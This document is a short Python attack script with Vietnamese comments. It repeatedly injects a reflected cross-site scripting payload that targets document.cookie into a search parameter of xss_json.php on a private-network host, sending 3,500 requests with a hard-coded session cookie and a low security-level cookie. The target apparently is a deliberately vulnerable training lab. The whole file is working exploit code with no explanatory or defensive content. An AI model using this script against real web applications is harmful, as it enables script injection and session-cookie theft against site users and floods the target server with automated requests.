import requests
import time

# URL gốc với payload XSS đã mã hóa
url = "http://192.168.10.10/xss_json.php"

# Số lượng request cần thực hiện
num_requests = 3500

# Payload tấn công XSS - mã hóa phù hợp cho URL
payload = "\"}]}';alert(document.cookie)</script>"

# Cookie cần gửi
cookies = {
    'security_level': '0',
    'PHPSESSID': '0k6gg6biqflmnbb39ttveugod1'
}

# Hàm thực hiện request
def send_xss_requests():
    for i in range(num_requests):
        # Tham số GET chứa payload XSS
        params = {
            'title': payload,
            'action': 'search'
        }

        # Gửi request GET kèm theo cookies
        response = requests.get(url, params=params, cookies=cookies)
        
        # Kiểm tra kết quả trả về
        if response.status_code == 200:
            print(f"Request {i+1}: Thành công!")
        else:
            print(f"Request {i+1}: Thất bại")
        
        # Chờ 0.5 giây trước khi thực hiện request tiếp theo
        time.sleep(0.5)

# Thực hiện request
send_xss_requests()
